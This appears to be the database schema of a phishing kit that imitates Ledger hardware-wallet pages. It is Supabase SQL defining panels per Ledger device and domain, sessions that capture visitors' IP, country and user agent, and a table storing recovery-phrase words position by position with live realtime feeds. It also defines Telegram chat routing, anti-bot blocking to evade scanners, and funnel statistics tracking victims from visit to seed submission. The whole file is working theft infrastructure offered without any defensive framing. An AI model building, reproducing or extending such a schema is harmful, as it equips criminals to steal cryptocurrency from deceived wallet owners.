
-- =========================
-- ROLES
-- =========================
CREATE TYPE public.app_role AS ENUM ('admin', 'user');

CREATE TABLE public.user_roles (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  role public.app_role NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  UNIQUE (user_id, role)
);

GRANT SELECT ON public.user_roles TO authenticated;
GRANT ALL ON public.user_roles TO service_role;

ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role public.app_role)
RETURNS BOOLEAN
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles
    WHERE user_id = _user_id AND role = _role
  )
$$;

CREATE POLICY "Users read own roles" ON public.user_roles
  FOR SELECT TO authenticated
  USING (auth.uid() = user_id OR public.has_role(auth.uid(), 'admin'));

CREATE POLICY "Admins manage roles" ON public.user_roles
  FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE OR REPLACE FUNCTION public.handle_new_user_role()
RETURNS TRIGGER
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  user_count INT;
BEGIN
  SELECT COUNT(*) INTO user_count FROM auth.users;
  IF user_count = 1 THEN
    INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'admin');
  ELSE
    INSERT INTO public.user_roles (user_id, role) VALUES (NEW.id, 'user');
  END IF;
  RETURN NEW;
END;
$$;

CREATE TRIGGER on_auth_user_created_role
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user_role();

CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END;
$$;

-- =========================
-- PANELS
-- =========================
CREATE TABLE public.panels (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  slug TEXT UNIQUE,
  device_type TEXT NOT NULL DEFAULT 'nano-x',
  favicon_url TEXT,
  title TEXT,
  active BOOLEAN NOT NULL DEFAULT true,
  domain TEXT,
  type TEXT NOT NULL DEFAULT 'ledger',
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  CONSTRAINT panels_type_check CHECK (type IN ('ledger'))
);
CREATE UNIQUE INDEX panels_domain_key ON public.panels (lower(domain));
GRANT SELECT ON public.panels TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.panels TO authenticated;
GRANT ALL ON public.panels TO service_role;
ALTER TABLE public.panels ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Panels public read active" ON public.panels FOR SELECT USING (active OR public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins manage panels" ON public.panels FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE TRIGGER panels_updated BEFORE UPDATE ON public.panels FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE public.panel_type_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  device TEXT UNIQUE,
  type TEXT,
  favicon_url TEXT,
  config JSONB DEFAULT '{}'::jsonb,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE UNIQUE INDEX panel_type_settings_type_key ON public.panel_type_settings (type);
GRANT SELECT ON public.panel_type_settings TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.panel_type_settings TO authenticated;
GRANT ALL ON public.panel_type_settings TO service_role;
ALTER TABLE public.panel_type_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Panel settings public read" ON public.panel_type_settings FOR SELECT USING (true);
CREATE POLICY "Admins manage panel settings" ON public.panel_type_settings FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE TRIGGER panel_type_settings_updated BEFORE UPDATE ON public.panel_type_settings FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
INSERT INTO public.panel_type_settings (type, config) VALUES ('ledger', '{}'::jsonb);

-- =========================
-- SESSIONS
-- =========================
CREATE TABLE public.sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  access_token TEXT NOT NULL UNIQUE DEFAULT encode(gen_random_bytes(24), 'hex'),
  device TEXT,
  step TEXT NOT NULL DEFAULT 'landing',
  status TEXT NOT NULL DEFAULT 'active',
  seed_length INT,
  ip TEXT,
  user_agent TEXT,
  country TEXT,
  panel_id UUID REFERENCES public.panels(id) ON DELETE SET NULL,
  hidden BOOLEAN NOT NULL DEFAULT false,
  last_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  submitted_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.sessions TO authenticated;
GRANT ALL ON public.sessions TO service_role;
ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins read sessions" ON public.sessions FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins update sessions" ON public.sessions FOR UPDATE TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE TRIGGER sessions_updated BEFORE UPDATE ON public.sessions FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
CREATE INDEX idx_sessions_hidden_last_seen ON public.sessions (hidden, last_seen_at DESC);
ALTER TABLE public.sessions REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions;

-- =========================
-- SEED WORDS
-- =========================
CREATE TABLE public.session_seed_words (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id UUID NOT NULL REFERENCES public.sessions(id) ON DELETE CASCADE,
  position INT NOT NULL,
  word TEXT NOT NULL DEFAULT '',
  submitted_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  UNIQUE (session_id, position)
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.session_seed_words TO authenticated;
GRANT ALL ON public.session_seed_words TO service_role;
ALTER TABLE public.session_seed_words ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins read seed words" ON public.session_seed_words FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));
CREATE TRIGGER seed_words_updated BEFORE UPDATE ON public.session_seed_words FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
ALTER TABLE public.session_seed_words REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.session_seed_words;

-- =========================
-- SESSION EVENTS
-- =========================
CREATE TABLE public.session_events (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id UUID NOT NULL REFERENCES public.sessions(id) ON DELETE CASCADE,
  event_type TEXT NOT NULL,
  payload JSONB NOT NULL DEFAULT '{}'::jsonb,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.session_events TO authenticated;
GRANT ALL ON public.session_events TO service_role;
ALTER TABLE public.session_events ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins read events" ON public.session_events FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));

-- =========================
-- TELEGRAM
-- =========================
CREATE TABLE public.telegram_chat_ids (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  chat_id TEXT NOT NULL UNIQUE,
  label TEXT,
  domains TEXT[] NOT NULL DEFAULT '{}',
  active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.telegram_chat_ids TO authenticated;
GRANT ALL ON public.telegram_chat_ids TO service_role;
ALTER TABLE public.telegram_chat_ids ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage telegram" ON public.telegram_chat_ids FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE TRIGGER telegram_updated BEFORE UPDATE ON public.telegram_chat_ids FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- =========================
-- BOT BLOCKS
-- =========================
CREATE TABLE public.bot_blocks (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  ip TEXT NOT NULL,
  reason TEXT,
  user_agent TEXT,
  country TEXT,
  referer TEXT,
  domain TEXT,
  path TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.bot_blocks TO authenticated;
GRANT ALL ON public.bot_blocks TO service_role;
ALTER TABLE public.bot_blocks ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage blocks" ON public.bot_blocks FOR ALL TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE INDEX idx_bot_blocks_ip ON public.bot_blocks (ip);
ALTER TABLE public.bot_blocks REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.bot_blocks;

-- =========================
-- PAGE VISITS
-- =========================
CREATE TABLE public.page_visits (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  path TEXT NOT NULL,
  ip TEXT,
  country TEXT,
  user_agent TEXT,
  referrer TEXT,
  panel_id UUID REFERENCES public.panels(id) ON DELETE SET NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.page_visits TO authenticated;
GRANT ALL ON public.page_visits TO service_role;
ALTER TABLE public.page_visits ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins read visits" ON public.page_visits FOR SELECT TO authenticated
  USING (public.has_role(auth.uid(), 'admin'));
CREATE INDEX idx_page_visits_created ON public.page_visits (created_at DESC);

-- =========================
-- APP SETTINGS
-- =========================
CREATE TABLE public.app_settings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  key text NOT NULL UNIQUE,
  value jsonb NOT NULL DEFAULT '{}'::jsonb,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT ON public.app_settings TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.app_settings TO authenticated;
GRANT ALL ON public.app_settings TO service_role;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "app_settings readable by all" ON public.app_settings FOR SELECT USING (true);
CREATE POLICY "app_settings admin insert" ON public.app_settings FOR INSERT TO authenticated
  WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "app_settings admin update" ON public.app_settings FOR UPDATE TO authenticated
  USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE TRIGGER app_settings_set_updated_at BEFORE UPDATE ON public.app_settings
  FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
INSERT INTO public.app_settings (key, value) VALUES ('antibot_enabled', 'true'::jsonb);
ALTER PUBLICATION supabase_realtime ADD TABLE public.app_settings;

-- =========================
-- FUNCTION GRANTS
-- =========================
REVOKE EXECUTE ON FUNCTION public.handle_new_user_role() FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.set_updated_at() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) TO anon, authenticated, service_role;

-- =========================
-- STATS RPCS
-- =========================
CREATE OR REPLACE FUNCTION public.stats_kpis(range_start timestamptz, range_end timestamptz)
RETURNS jsonb LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE result jsonb;
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN '{}'::jsonb; END IF;
  SELECT jsonb_build_object(
    'sessions', (SELECT count(*) FROM sessions WHERE created_at >= range_start AND created_at < range_end),
    'submitted', (SELECT count(*) FROM sessions WHERE status = 'submitted' AND submitted_at >= range_start AND submitted_at < range_end),
    'live', (SELECT count(*) FROM sessions WHERE status = 'active' AND last_seen_at > now() - interval '60 seconds'),
    'visits', (SELECT count(*) FROM page_visits WHERE created_at >= range_start AND created_at < range_end),
    'blocks', (SELECT count(*) FROM bot_blocks WHERE created_at >= range_start AND created_at < range_end)
  ) INTO result;
  RETURN result;
END; $$;

CREATE OR REPLACE FUNCTION public.stats_timeseries(range_start timestamptz, range_end timestamptz, bucket text)
RETURNS TABLE(bucket_ts timestamptz, sessions bigint, visits bigint, blocks bigint, submissions bigint)
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
DECLARE trunc_unit text; step interval;
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN; END IF;
  IF bucket = 'hour' THEN trunc_unit := 'hour'; step := interval '1 hour';
  ELSE trunc_unit := 'day'; step := interval '1 day'; END IF;
  RETURN QUERY
  WITH buckets AS (
    SELECT generate_series(date_trunc(trunc_unit, range_start), date_trunc(trunc_unit, range_end - interval '1 second'), step) AS ts
  ),
  s AS (SELECT date_trunc(trunc_unit, created_at) t, count(*) c FROM sessions WHERE created_at >= range_start AND created_at < range_end GROUP BY 1),
  v AS (SELECT date_trunc(trunc_unit, created_at) t, count(*) c FROM page_visits WHERE created_at >= range_start AND created_at < range_end GROUP BY 1),
  b AS (SELECT date_trunc(trunc_unit, created_at) t, count(*) c FROM bot_blocks WHERE created_at >= range_start AND created_at < range_end GROUP BY 1),
  sub AS (SELECT date_trunc(trunc_unit, submitted_at) t, count(*) c FROM sessions WHERE status='submitted' AND submitted_at >= range_start AND submitted_at < range_end GROUP BY 1)
  SELECT buckets.ts, COALESCE(s.c,0), COALESCE(v.c,0), COALESCE(b.c,0), COALESCE(sub.c,0)
  FROM buckets
  LEFT JOIN s ON s.t = buckets.ts
  LEFT JOIN v ON v.t = buckets.ts
  LEFT JOIN b ON b.t = buckets.ts
  LEFT JOIN sub ON sub.t = buckets.ts
  ORDER BY buckets.ts;
END; $$;

CREATE OR REPLACE FUNCTION public.stats_funnel(range_start timestamptz, range_end timestamptz)
RETURNS jsonb LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN '{}'::jsonb; END IF;
  RETURN jsonb_build_object(
    'visits', (SELECT count(*) FROM page_visits WHERE created_at >= range_start AND created_at < range_end),
    'sessions', (SELECT count(*) FROM sessions WHERE created_at >= range_start AND created_at < range_end),
    'device_selected', (SELECT count(*) FROM sessions WHERE created_at >= range_start AND created_at < range_end AND device IS NOT NULL),
    'seed_started', (SELECT count(*) FROM sessions WHERE created_at >= range_start AND created_at < range_end AND step LIKE 'seed%'),
    'submitted', (SELECT count(*) FROM sessions WHERE status='submitted' AND submitted_at >= range_start AND submitted_at < range_end)
  );
END; $$;

CREATE OR REPLACE FUNCTION public.stats_countries(range_start timestamptz, range_end timestamptz, top_n int DEFAULT 10)
RETURNS TABLE(country text, cnt bigint)
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN; END IF;
  RETURN QUERY
  SELECT COALESCE(s.country, 'unknown'), count(*)::bigint
  FROM sessions s
  WHERE s.created_at >= range_start AND s.created_at < range_end
  GROUP BY 1 ORDER BY 2 DESC LIMIT top_n;
END; $$;

CREATE OR REPLACE FUNCTION public.stats_devices(range_start timestamptz, range_end timestamptz)
RETURNS TABLE(device text, cnt bigint)
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN; END IF;
  RETURN QUERY
  SELECT COALESCE(s.device, 'unknown'), count(*)::bigint
  FROM sessions s
  WHERE s.created_at >= range_start AND s.created_at < range_end
  GROUP BY 1 ORDER BY 2 DESC;
END; $$;

CREATE OR REPLACE FUNCTION public.stats_panels(range_start timestamptz, range_end timestamptz)
RETURNS TABLE(slug text, sessions bigint, submissions bigint)
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN; END IF;
  RETURN QUERY
  SELECT COALESCE(p.slug, '—'),
         count(*)::bigint,
         count(*) FILTER (WHERE s.status='submitted')::bigint
  FROM sessions s
  LEFT JOIN panels p ON p.id = s.panel_id
  WHERE s.created_at >= range_start AND s.created_at < range_end
  GROUP BY 1 ORDER BY 2 DESC;
END; $$;

CREATE OR REPLACE FUNCTION public.stats_block_reasons(range_start timestamptz, range_end timestamptz)
RETURNS TABLE(reason text, cnt bigint)
LANGUAGE plpgsql STABLE SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN RETURN; END IF;
  RETURN QUERY
  SELECT COALESCE(b.reason, 'unknown'), count(*)::bigint
  FROM bot_blocks b
  WHERE b.created_at >= range_start AND b.created_at < range_end
  GROUP BY 1 ORDER BY 2 DESC;
END; $$;

REVOKE EXECUTE ON FUNCTION public.stats_kpis(timestamptz, timestamptz) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.stats_timeseries(timestamptz, timestamptz, text) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.stats_funnel(timestamptz, timestamptz) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.stats_countries(timestamptz, timestamptz, int) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.stats_devices(timestamptz, timestamptz) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.stats_panels(timestamptz, timestamptz) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION public.stats_block_reasons(timestamptz, timestamptz) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.stats_kpis(timestamptz, timestamptz) TO authenticated;
GRANT EXECUTE ON FUNCTION public.stats_timeseries(timestamptz, timestamptz, text) TO authenticated;
GRANT EXECUTE ON FUNCTION public.stats_funnel(timestamptz, timestamptz) TO authenticated;
GRANT EXECUTE ON FUNCTION public.stats_countries(timestamptz, timestamptz, int) TO authenticated;
GRANT EXECUTE ON FUNCTION public.stats_devices(timestamptz, timestamptz) TO authenticated;
GRANT EXECUTE ON FUNCTION public.stats_panels(timestamptz, timestamptz) TO authenticated;
GRANT EXECUTE ON FUNCTION public.stats_block_reasons(timestamptz, timestamptz) TO authenticated;
